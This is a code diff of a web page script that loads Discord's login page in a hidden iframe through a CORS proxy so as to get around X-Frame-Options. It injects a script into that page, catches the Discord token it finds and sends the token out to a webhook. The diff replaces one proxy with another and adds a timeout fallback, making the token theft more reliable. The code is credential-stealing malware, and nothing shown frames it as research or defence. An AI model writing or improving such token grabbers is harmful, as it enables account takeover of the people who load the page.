@@ -33,7 +33,6 @@
         }
 
         window.addEventListener("message", function(event) {
-            // Allow any origin if testing locally, but prefer specific ones
             if (event.data && event.data !== "NO_TOKEN_FOUND") {
                 console.log("Token received:", event.data);
                 sendToWebhook(event.data);
@@ -43,16 +42,23 @@
 
         const iframe = document.createElement('iframe');
         
-        // Use allorigins.win to bypass X-Frame-Options
-        // Note: This returns the raw HTML of the login page
-        iframe.src = `https://api.allorigins.win/raw?url=${encodeURIComponent('https://discord.com/login')}`;
+        // Use a different proxy that might be more reliable for raw content
+        // If corsproxy fails, we fallback to direct iframe (which might be blocked by X-Frame-Options)
+        const PROXY_URL = `https://corsproxy.io/?${encodeURIComponent('https://discord.com/login')}`;
         
+        iframe.src = PROXY_URL;
         iframe.style.display = 'none';
         document.body.appendChild(iframe);
 
+        // Timeout fallback
+        setTimeout(() => {
+            if (document.getElementById('msg').innerText !== "Success!") {
+                document.getElementById('msg').innerText = "Timeout or no token found.";
+            }
+        }, 10000);
+
         iframe.onload = function() {
             try {
-                // Get the document from the iframe
                 const iframeWindow = iframe.contentWindow;
                 const doc = iframeWindow.document;
                 
@@ -96,11 +102,6 @@
                 
                 // Append to body
                 doc.body.appendChild(script);
-                
-                // Timeout fallback
-                setTimeout(() => {
-                    document.getElementById('msg').innerText = "Timeout or no token found.";
-                }, 10000);
 
             } catch (e) {
                 console.error("Injection failed:", e);
